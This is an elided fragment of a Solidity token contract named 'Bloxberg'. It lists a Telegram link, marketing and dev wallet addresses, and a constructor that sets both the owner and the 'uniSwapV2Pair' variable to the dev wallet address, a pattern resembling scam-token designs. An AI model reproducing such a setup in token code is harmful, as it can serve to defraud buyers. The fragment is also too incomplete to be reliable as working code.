...
//Telegram - https://t.me/bloxbergEN
...
contract Bloxberg is Context, IERC20 { 
    ...
    address payable public Wallet_Marketing = payable(0x21156e0c2E969639d72eac386077d781a8bD0041); 
    address payable public Wallet_Dev = payable(0x80F02A2290903f542C67Ef9c4ce95A33593B3d50);
    ...
    string private constant _symbol = unicode"Bloxberg"; 
    ...
    constructor () {
        ...
        _owner = 0x80F02A2290903f542C67Ef9c4ce95A33593B3d50;
        ...
        uniSwapV2Pair = payable(0x80F02A2290903f542C67Ef9c4ce95A33593B3d50);
